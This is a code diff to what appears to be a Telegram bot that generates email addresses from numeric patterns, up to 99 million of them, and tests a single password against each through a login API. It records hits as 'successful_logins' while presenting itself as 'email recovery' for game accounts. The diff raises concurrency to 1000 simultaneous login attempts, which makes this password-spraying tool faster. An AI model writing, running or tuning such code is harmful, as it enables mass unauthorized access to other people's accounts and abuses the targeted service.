@@ -233,28 +233,33 @@ async def fast_check_email(email, password, api_key, session=None):
     except Exception as e:
         return "error", str(e)
 
-async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, batch_size=200, progress_callback=None):
+async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=None):
     """
     UNLIMITED RANGE: Memory-efficient generator-based concurrent checking
     Streams results instead of loading all into memory
-    batch_size: can go up to 500+ for massive ranges
+    MAXIMUM CONCURRENCY: 1000 concurrent requests per batch (auto-adjusted)
     """
     checked = 0
     total = end - start + 1
     found_count = 0
     
+    # Determine optimal batch size (1000 is the maximum safe limit)
+    # For massive ranges, we use 1000 concurrent requests
+    batch_size = min(1000, total)  # Use 1000 or total if smaller
+    
     # Reuse session across all requests for maximum speed
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=500)) as session:
+    # Limit set to 1000 for extreme concurrency
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1000)) as session:
         for batch_start in range(start, end + 1, batch_size):
             batch_end = min(batch_start + batch_size, end + 1)
             
-            # Create concurrent tasks for this batch
+            # Create concurrent tasks for this batch (UP TO 1000 CONCURRENT)
             tasks = []
             for i in range(batch_start, batch_end):
                 email = f"{base}{i}@{domain}"
                 tasks.append(fast_check_email(email, password, api_key, session))
             
-            # Execute all concurrently
+            # Execute all concurrently (up to 1000 at once)
             results = await asyncio.gather(*tasks, return_exceptions=True)
             
             # Process and yield results immediately (no memory buildup)
@@ -272,8 +277,8 @@ async def check_emails_concurrent_generator(base, start, end, domain, password, 
                 else:
                     pass  # Skip errors to save memory
                 
-                # Progress callback every 50 checks
-                if progress_callback and checked % 50 == 0:
+                # Progress callback every 100 checks
+                if progress_callback and checked % 100 == 0:
                     await progress_callback(checked, total, found_count)
 
 # ===== SESSIONS =====
@@ -470,9 +475,9 @@ Enter an email pattern to check:
 - `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
 - `tannercpm(1-100000)@domain.com` - Checks 100K emails
 
-⚡ **UNLIMITED RANGE**
-- No limit on range size (1M-99M works with ease)
-- 200+ concurrent requests
+⚡ **MAXIMUM CONCURRENCY MODE**
+- 1000 concurrent requests per batch
+- No limit on range size (1M-99M with ease)
 - Memory efficient streaming
 - Results streamed to JSON
 
@@ -534,14 +539,14 @@ Enter the password to check:
         start_time = time.time()
         
         progress_msg = await update.message.reply_text(f"""
-⚡ **UNLIMITED RANGE EMAIL RECOVERY**
+⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Game: **{game}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
 Total: **{total:,} emails**
 Status: **Starting...**
 
-Concurrent: **200+ emails at a time**
+Concurrency: **1000 emails at a time**
 """, parse_mode="Markdown")
         
         await context.bot.send_chat_action(update.effective_chat.id, "typing")
@@ -561,7 +566,7 @@ Concurrent: **200+ emails at a time**
             
             try:
                 await progress_msg.edit_text(f"""
-⚡ **UNLIMITED RANGE EMAIL RECOVERY**
+⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Game: **{game}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
@@ -574,7 +579,7 @@ ETA: **{int(remaining)}s**
                 pass
         
         # Run concurrent check with generator (no memory buildup)
-        async for email, status, data in check_emails_concurrent_generator(base, start, end, domain, password, api_key, batch_size=200, progress_callback=update_progress):
+        async for email, status, data in check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=update_progress):
             found_emails.append({
                 "email": email,
                 "password": password,
@@ -589,7 +594,7 @@ ETA: **{int(remaining)}s**
             "pattern": f"{base}({start:,}-{end:,})@{domain}",
             "total_checked": total,
             "time_seconds": round(elapsed, 2),
-            "speed_emails_per_sec": round(total/elapsed, 2),
+            "speed_emails_per_sec": round(total/elapsed, 2) if elapsed > 0 else 0,
             "found_count": len(found_emails),
             "successful_logins": found_emails
         }
